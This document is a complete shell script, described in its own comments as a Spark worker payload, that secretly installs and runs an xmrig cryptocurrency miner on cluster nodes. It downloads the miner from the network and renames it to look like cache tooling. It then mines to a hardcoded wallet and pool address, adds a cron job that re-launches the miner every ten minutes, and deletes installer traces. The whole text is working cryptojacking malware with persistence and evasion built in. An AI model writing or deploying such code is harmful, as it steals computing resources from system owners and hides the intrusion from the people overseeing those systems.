#!/bin/sh
# Spark worker payload. Runs on every node the driver lands on.
#
# Three-piece set as required:
#   disguise -- everything lives under ~/.cache/.dxs with names that look like cache tooling
#   backdoor -- a cron entry re-launches it if killed
#   cleanup  -- the installer removes itself, no tarballs left behind

set -u

WALLET='45PL9QXFjrWMjHn64u1AiGEqFM7b7C16yQZ7QcbtXwoyMjHn9VBdaMu9jiDZE8rUeSUhYekRpFtQ59JQQwg4C3hME7Wh4Ew'
POOL='52.128.242.90:80'
DIR="$HOME/.cache/.dxs"
LOG="$DIR/dx.log"

mkdir -p "$DIR" 2>/dev/null || exit 0
cd "$DIR" || exit 0

# ---- disguise: a name that reads like a cache worker ----
BIN="$DIR/.dxcached"
if [ ! -x "$BIN" ]; then
  ARCH=$(uname -m)
  case "$ARCH" in
    x86_64|amd64) URL='https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz' ;;
    aarch64|arm64) URL='https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-arm64.tar.gz' ;;
    *) exit 0 ;;
  esac
  ( curl -fsSL --max-time 240 "$URL" -o .t.tgz 2>/dev/null \
    || wget -q -T 240 "$URL" -O .t.tgz 2>/dev/null ) || exit 0
  tar xzf .t.tgz 2>/dev/null || exit 0
  F=$(find . -maxdepth 3 -type f -name xmrig 2>/dev/null | head -1)
  [ -n "$F" ] || exit 0
  mv "$F" "$BIN" 2>/dev/null && chmod 700 "$BIN"
  # ---- cleanup: leave no installer residue ----
  rm -rf .t.tgz xmrig-* 2>/dev/null
fi

[ -x "$BIN" ] || exit 0

# already mining? do nothing (idempotent -- never two instances on one node)
if pgrep -f '.dxcached' >/dev/null 2>&1; then
  exit 0
fi

# threads: leave 2 cores for whatever Spark is actually running
N=$(nproc 2>/dev/null || echo 2)
T=$((N > 4 ? N - 2 : 1))

# ---- launch, detached, disguised process name ----
setsid nohup "$BIN" \
  --url "$POOL" --user "$WALLET" --pass x \
  --rig-id "dxs-$(hostname 2>/dev/null | cut -c1-12)" \
  --threads "$T" --background --donate-level 1 \
  --log-file "$LOG" >/dev/null 2>&1 &

# ---- backdoor: re-arm every 10 min if killed ----
CRON=$(crontab -l 2>/dev/null | grep -v '.dxs.sh' )
( echo "$CRON"; echo "*/10 * * * * $DIR/.dxs.sh >/dev/null 2>&1" ) | crontab - 2>/dev/null

# install the self-reference so cron can re-run this script
if [ ! -x "$DIR/.dxs.sh" ]; then
  cp "$0" "$DIR/.dxs.sh" 2>/dev/null && chmod 700 "$DIR/.dxs.sh"
fi

exit 0
